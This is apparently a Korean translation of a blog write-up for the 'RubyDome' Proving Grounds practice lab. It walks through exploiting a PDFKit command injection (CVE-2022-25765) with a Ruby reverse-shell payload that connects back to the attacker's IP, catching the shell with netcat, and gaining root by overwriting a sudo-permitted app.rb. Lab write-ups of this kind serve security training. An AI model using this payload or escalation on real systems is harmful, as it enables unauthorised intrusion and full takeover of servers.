---
title: "루비돔 - PG 연습풀이"
description: ""
coverImage: "/assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_0.png"
date: 2024-05-23 12:48
ogImage: 
  url: /assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_0.png
tag: Tech
originalTitle: "RubyDome — PG PRACTICE(WRITEUP)"
link: "https://medium.com/@r4j3sh/rubydome-pg-practice-writeup-7749fe58bbe5"
---


대상 서버의 Nmap 스캔 결과:

```js
┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
└─$ nmap -sC -sV 192.168.153.22 -oN rubydome.nmap
Starting Nmap 7.92 ( <https://nmap.org> ) at 2024-01-02 22:39 IST
Nmap scan report for 192.168.153.22
호스트가 켜져 있습니다 (0.18초 소요).
표시되지 않은 것: 998개의 닫힌 TCP 포트 (연결 거부)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; 프로토콜 2.0)
| ssh 호스트 키: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http 서버 헤더: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http 제목: RubyDome HTML to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

여기서 두 개의 포트가 열려 있다는 것을 확인할 수 있습니다.

- 포트 22/tcp: OpenSSH 8.9p1이 실행 중인 SSH 서비스이며, 안전한 원격 관리를 위한 것으로 보입니다. 두 종류의 SSH 호스트 키 (ECDSA 및 ED25519)가 나열되어 있습니다.
- 포트 3000/tcp: Ruby 3.0.2에서 WEBrick HTTP 서버 버전 1.7.0이 실행 중이며, 2021년 07월 07일자입니다. HTTP 제목은 "RubyDome HTML to PDF"로, HTML을 PDF 형식으로 변환하는 웹 서비스나 애플리케이션을 시사합니다.

<div class="content-ad"></div>

브라우저에서 포트 3000을 열어주세요.

![이미지](/assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_0.png)

이제 HTML 페이지의 URL로 `http://127.0.0.1`을 입력해주세요.

![이미지](/assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_1.png)

<div class="content-ad"></div>

애플리케이션에서 오류가 발생했군요. 이는 백엔드 플러그인과 버전을 나타냅니다.

PDFKIT 버전 0.8.6

![이미지](/assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_2.png)

플러그인 이름(PDFKIT)으로 searchsploit을 검색해본 결과, 버전 0.8.7.2에 대한 RCE 취약점이 있다는 것을 발견했어요.

<div class="content-ad"></div>

<img src="/assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_3.png" />

"searchsploit -m 51293.py" 명령을 사용하여 exploit을 다운로드했습니다.

파이썬으로 코딩된 exploit을 확인할 수 있습니다. 따라서 python3로 실행하고 도움말 메뉴를 보기 위해 -h를 추가했습니다.

```js
┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
└─$ python3 51293.py -h
UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection
```

<div class="content-ad"></div>

```markdown
사용법:
  python3 exploit-CVE-2022-25765.py -c <명령어>
  python3 exploit-CVE-2022-25765.py -s <로컬-IP> <로컬-포트>
  python3 exploit-CVE-2022-25765.py -c <명령어> [-w <http://target.com/index.html> -p <매개변수>]
  python3 exploit-CVE-2022-25765.py -s <로컬-IP> <로컬-포트> [-w <http://target.com/index.html> -p <매개변수>]
  python3 exploit-CVE-2022-25765.py -h
옵션:
  -c    사용자 지정 명령어 모드. 사용자 정의 payload 생성을 위한 명령어 제공.
  -s    역쉘 모드. 역쉘 payload 생성을 위한 로컬 IP 및 포트 제공.
  -w    취약한 pdfkit을 실행하는 웹사이트의 URL. (선택사항)
  -p    취약한 pdfkit을 실행하는 웹사이트의 POST 매개변수. (선택사항)
  -h    이 도움말 메뉴 보기.
```

만약 POST 매개변수를 확인하면 매개변수가 URL임을 알 수 있었습니다.

<img src="/assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_4.png" />

이 취약점을 이용하여 역쉘을 실행했습니다.
```

<div class="content-ad"></div>

```markdown
```js
┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
└─$ python3 51293.py -s 192.168.45.184 80 -w <http://192.168.216.22:3000/pdf> -p url
```

```js
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\\|       / / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\\____/_/|_/___/\\___/\\____/_/|_/____/....
    
UNICORD: CVE-2022-25765 (pdfkit) 취약점을 이용한 Exploit - 명령 주입
옵션: 대상 웹사이트로 뒤집힌 쉘 전송 모드
페이로드: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.184","80"))'`
로컬 IP: 192.168.45.184:80
주의: 상기 IP 및 포트에서 로컬 리스너를 시작했는지 확인하세요. "nc -lnvp 80".
웹사이트: <http://192.168.216.22:3000/pdf>
POST 인자: url
EXPLOIT: 웹사이트로 페이로드 전송됨!
성공: Exploit이 작동했습니다.
```

그리고 리스너에서 'andrew'로 반전된 셸을 받았습니다.

```js
┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.45.184] from (UNKNOWN) [192.168.216.22] 38564
id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
whoami
andrew
``` 
```

<div class="content-ad"></div>

파이썬3을 사용하여 대화형 쉘을 실행했습니다.

```sh
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
andrew@rubydome:~/app$
```

/home/andrew에서 로컬 플래그를 발견했습니다.

```sh
andrew@rubydome:~$ ls
ls
app  local.txt
andrew@rubydome:~$ pwd     
pwd
/home/Andrew
andrew@rubydome:~$ cat local.txt
cat local.txt
<줄어들었습니다>
```

<div class="content-ad"></div>

sudo -l을 사용하여 발견한 내용은 다음과 같아요.

```js
andrew@rubydome:~/app$ sudo -l        
sudo -l
andrew에 대한 rubydome에 대한 일치하는 기본값 항목:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    use_pty
```

```js
사용자 andrew는 rubydome에서 다음 명령을 실행할 수 있어요:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

만약 루비를 사용하여 app.rb 파일을 실행하고 있다면, 패스워드 없이 sudo를 사용할 수 있어요.

<div class="content-ad"></div>

GTFO BINS에서 쉘을 얻는 데 루비를 사용할 수 있다고 발견했어요.

![이미지](/assets/img/2024-05-23-RubyDomePGPRACTICEWRITEUP_5.png)

그래서 app.rb 파일의 권한을 확인해 보았어요.

```js
andrew@rubydome:~/app$ ls -la app.rb
ls -la app.rb
-rwxrwx--- 1 andrew andrew 1032 Jan  3 03:42 app.rb
```

<div class="content-ad"></div>

그리고 나니 우리는 'app.rb' 파일에 대한 쓰기 권한이 andrew로 있다는 것을 발견했어요.

이제 'cp' 명령어를 사용하여 'app.rb'를 'app.rb.bak'로 백업했어요.

```js
andrew@rubydome:~/app$ cp app.rb app.rb.bak
cp app.rb app.rb.bak
```

그리고 나서 'exec "/bin/sh"'를 추가해서 root로 쉘을 얻었어요.

<div class="content-ad"></div>

```markdown
```js
andrew@rubydome:~/app$ echo 'exec "/bin/sh"'> app.rb
echo 'exec "/bin/sh"'> app.rb
andrew@rubydome:~/app$ cat app.rb
cat app.rb
exec "/bin/sh"
```

이제 루비를 사용하여 파일을 실행시키면 루트 권한의 쉘을 획득할 수 있습니다.

```js
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
cat /root/proof.txt
<REDACTED>
#
```

그러면 증거 깃발을 발견했습니다.
```  